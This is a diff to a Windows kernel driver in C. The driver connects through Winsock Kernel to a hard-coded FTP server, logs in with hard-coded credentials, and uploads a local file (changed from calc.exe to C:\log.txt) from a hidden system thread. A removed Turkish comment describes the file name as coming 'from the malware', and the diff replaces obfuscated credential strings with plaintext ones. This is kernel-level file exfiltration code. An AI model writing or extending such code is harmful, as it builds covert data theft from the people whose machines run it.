@@ -4,7 +4,7 @@
 
 #define IP_ADDRESS                  L"192.168.11.68"
 #define TCP_PORT                    L"21"
-#define MAXSZ 100  // Maximum size of the data buffer
+#define MAXSZ 100  
 
 
 #define DebuggerPrint(...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, __VA_ARGS__);
@@ -20,6 +20,9 @@ EXTERN_C_END
 const size_t DEFAULT_BUFFER_LEN = PAGE_SIZE;
 SOCKET    ClientSocket = WSK_INVALID_SOCKET;
 PETHREAD  ClientThread = NULL;
+
+PETHREAD  ClientFTPFileUpload = NULL;
+LPCWSTR PORTSTR = NULL;
 
 VOID WSKClientThread(
     _In_ PVOID Context
@@ -37,10 +40,6 @@ VOID CloseWSKClient(
     PETHREAD LocalThread
 );
 
-
-PETHREAD  ClientFTPFileUpload = NULL;
-LPCWSTR PORTSTR = NULL;
-
 VOID FTPUploadFile(
     SOCKET   Socket
 );
@@ -55,9 +54,7 @@ VOID DriverUnload(_In_ DRIVER_OBJECT* DriverObject)
 {
     UNREFERENCED_PARAMETER(DriverObject);
 
-    //CloseWSKClient();
-
-
+    CloseWSKClient(ClientSocket, ClientThread);
     WSKCleanup();
 }
 
@@ -133,6 +130,7 @@ NTSTATUS StartWSKClient(
 
         Status = WSKGetAddrInfo(NodeName, ServiceName, NS_ALL, NULL,
             &Hints, &AddrInfo, WSK_INFINITE_WAIT, NULL, NULL);
+        
         if (!NT_SUCCESS(Status))
         {
             DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
@@ -141,8 +139,7 @@ NTSTATUS StartWSKClient(
 
             break;
         }
-
-        // Make sure we got at least one address back
+        
         if (AddrInfo == NULL)
         {
             DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
@@ -211,7 +208,6 @@ NTSTATUS StartWSKClient(
             "[WSK] [Client] Connection established...\n");
 
         HANDLE ThreadHandle = NULL;
-
         Status = PsCreateSystemThread(&ThreadHandle, SYNCHRONIZE, NULL, NULL, NULL, &WSKClientThread, (PVOID)ClientSocket);
         if (!NT_SUCCESS(Status))
         {
@@ -223,16 +219,10 @@ NTSTATUS StartWSKClient(
         }
 
         Status = ObReferenceObjectByHandleWithTag(ThreadHandle, SYNCHRONIZE, *PsThreadType, KernelMode, TAG_POOL, (PVOID*)&ClientThread, NULL);
-
-        ZwClose(ThreadHandle);
-
-        if (!NT_SUCCESS(Status))
+        if (NULL != ThreadHandle)
         {
-            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
-                "[WSK] [Client] ObReferenceObjectByHandleWithTag failed: 0x%08X.\n",
-                Status);
-
-            break;
+            ZwClose(ThreadHandle);
+            ThreadHandle = NULL;
         }
 
     } while (FALSE);
@@ -267,24 +257,11 @@ VOID WSKClientThread(
     SOCKET   Socket = (SOCKET)Context;
 
     char    Buffer[PAGE_SIZE] = { 0 };
-    //char USER[PAGE_SIZE] = "USER pixel.painter\r\n"; // Initialize USER array with zeros
-    //char PASSWORD[PAGE_SIZE] = { 0 }; // Initialize PASSWORD array with zeros
-
-    // Copy deobfuscated strings into arrays
-    //strcpy(USER, (char*)DeobfuscationString("eaecfaed9fcfd6c7dad391cfded6d1cbdacde3cde3d1"));
-   
-   
-    
-    char USER[PAGE_SIZE] = { '\0' };
-    char PASSWORD[PAGE_SIZE] = {'\0'};
-
-    *PASSWORD = CharStringToHex("eaecfaed9fcfd6c7dad391cfded6d1cbdacde3cde3d1");
-    //hexData = DeobfuscationString("effeecece8f0edfb9fcd8bc8c888fee5e88c91ecd2dd87feccfbfe");
-  
+    char USER[PAGE_SIZE] = "USER ftpuser\r\n"; 
+    char PASSWORD[PAGE_SIZE] = "PASS 123456\r\n";
 
     SIZE_T Bytes = 0u;
     INT    SocketType = 0;
-
 
     Bytes = sizeof SocketType;
     Status = WSKGetSocketOpt(Socket, SOL_SOCKET, SO_TYPE, &SocketType, &Bytes);
@@ -332,10 +309,9 @@ VOID WSKClientThread(
                 continue;
             }
 
-            if (strstr(Buffer, "220 ") > 0 || strstr(Buffer, "421 ") > 0)
-                break; // break this wile
+            if (strstr(Buffer, "220") > 0 || strstr(Buffer, "421") > 0)
+                break; //break this while
         }
-
 
         DebuggerPrint("[WSK] [Client] Read  %Id bytes, data [%s] from server.\n", Bytes, (LPCSTR)Buffer);
 
@@ -405,9 +381,9 @@ VOID WSKClientThread(
         }
 
         FTPUploadFile(Socket); //Upload file
-
-        PsTerminateSystemThread(Status);//buna bak
     }
+
+    PsTerminateSystemThread(Status);
 }
 
 VOID FTPUploadFile(SOCKET   Socket)
@@ -470,7 +446,6 @@ VOID FTPUploadFile(SOCKET   Socket)
     PORTSTR = IntToLPCWSTR(PORT);
 
     HANDLE ThreadHandle = NULL;
-
     Status = PsCreateSystemThread(&ThreadHandle, SYNCHRONIZE, NULL, NULL, NULL, &WSKClientFTPFileUpload, (PVOID)Socket);
     if (!NT_SUCCESS(Status))
     {
@@ -482,21 +457,15 @@ VOID FTPUploadFile(SOCKET   Socket)
     }
 
     Status = ObReferenceObjectByHandleWithTag(ThreadHandle, SYNCHRONIZE, *PsThreadType, KernelMode, TAG_POOL, (PVOID*)&ClientFTPFileUpload, NULL);
-
-    ZwClose(ThreadHandle);
-
-    if (!NT_SUCCESS(Status))
+    if (NULL != ThreadHandle)
     {
-        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
-            "[WSK] [Client] ObReferenceObjectByHandleWithTag failed: 0x%08X.\n",
-            Status);
-
-        return Status;
+        ZwClose(ThreadHandle);
+        ThreadHandle = NULL;
     }
 
     if (!NT_SUCCESS(Status))
     {
-        CloseWSKClient(SocketFTP, ClientFTPFileUpload);//buna parametre olarak  ClientFTPFileUpload gelecek
+        CloseWSKClient(SocketFTP, ClientFTPFileUpload);
     }
 
     return Status;
@@ -514,11 +483,10 @@ VOID WSKClientFTPFileUpload(_In_ PVOID Context)
 
     char Buffer[PAGE_SIZE] = { '\0' };
 
-    Status = WSKConnectPassive //return SocketFTP
-    (IP_ADDRESS,
-        PORTSTR,
-        AF_INET,
-        SOCK_STREAM);
+    Status = WSKConnectPassive(IP_ADDRESS,
+                               PORTSTR,
+                               AF_INET,
+                               SOCK_STREAM);
 
     if (!NT_SUCCESS(Status))
     {
@@ -546,7 +514,6 @@ VOID WSKClientFTPFileUpload(_In_ PVOID Context)
 
     memset(Buffer, '\0', sizeof(Buffer));
 
-
     Bytes = sizeof SocketType;
     Status = WSKGetSocketOpt(Socket, SOL_SOCKET, SO_TYPE, &SocketType, &Bytes);
     if (!NT_SUCCESS(Status))
@@ -573,7 +540,7 @@ VOID WSKClientFTPFileUpload(_In_ PVOID Context)
 
     if (SocketType == SOCK_STREAM)
     {
-        strcpy(Buffer, "STOR calc.exe\r\n");//bu kısım zararlıdan gelecek
+        strcpy(Buffer, "STOR log.txt\r\n");
         Status = WSKSend(Socket, Buffer, strlen(Buffer), &Bytes, 0, NULL, NULL);/* Tell server to change to BINARY mode */
 
         memset(Buffer, '\0', sizeof(Buffer));
@@ -602,9 +569,10 @@ VOID WSKClientFTPFileUpload(_In_ PVOID Context)
     }
 
     WSKFTPSendFile(Socket);
+    
     FreeMemory((void*)PORTSTR);
-    //PsTerminateSystemThread(Status);
-
+    
+    PsTerminateSystemThread(Status);
 }
 
 VOID WSKFTPSendFile(SOCKET SocketLocal) //socket
@@ -620,28 +588,26 @@ VOID WSKFTPSendFile(SOCKET SocketLocal) //socket
     ULONG temp, temp1, file_size = 0, size, total = 0, down = 1;
 
     // Prepare Unicode string with the path to the file
-    RtlInitUnicodeString(&fileName, L"\\??\\C:\\Windows\\System32\\calc.exe");
+    RtlInitUnicodeString(&fileName, L"\\??\\C:\\log.txt");
 
     // Initialize object attributes
     InitializeObjectAttributes(&objectAttributes, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
     // Open the file
     NTSTATUS status = ZwCreateFile(&fileHandle,
-        GENERIC_READ,   // Desired access
+        GENERIC_READ,   
         &objectAttributes,
         &ioStatusBlock,
         NULL,
         FILE_ATTRIBUTE_NORMAL,
-        FILE_SHARE_READ,   // Share mode
-        FILE_OPEN,   // Open disposition
+        FILE_SHARE_READ,   
+        FILE_OPEN,   
         FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
         NULL,
         0);
 
     if (!NT_SUCCESS(status))
     {
-        // Error handling
-        DbgPrint("Failed to open file: 0x%X\n", status);
         DbgPrint("Failed to open file: 0x%X\n", status);
         return;
     }
@@ -661,28 +627,23 @@ VOID WSKFTPSendFile(SOCKET SocketLocal) //socket
 
     while (size > 0)
     {
-        // Read data from the file
         status = ZwReadFile(fileHandle, NULL, NULL, NULL, &ioStatusBlock, Buffer, MAXSZ, NULL, NULL);
         if (!NT_SUCCESS(status))
         {
             ZwClose(fileHandle);
-            DbgPrint("Failed to read from file: 0x%X\n", status);
             return;
         }
 
-        // Calculate progress and print progress bar
         Bytes = ioStatusBlock.Information;
         file_size += Bytes;
         total = 0;
 
         while (total < Bytes)
         {
-            // Send the read data over the socket
             status = WSKSend(SocketFTP, Buffer, strlen(Buffer), &Bytes, 0, NULL, NULL);
             if (!NT_SUCCESS(status))
             {
                 ZwClose(fileHandle);
-                DbgPrint("WSKSend failed: 0x%X\n", status);
                 return;
             }
             total += Bytes;
@@ -691,7 +652,6 @@ VOID WSKFTPSendFile(SOCKET SocketLocal) //socket
 
         size -= Bytes;
     }
-
     // Close the file handle
     ZwClose(fileHandle);
     
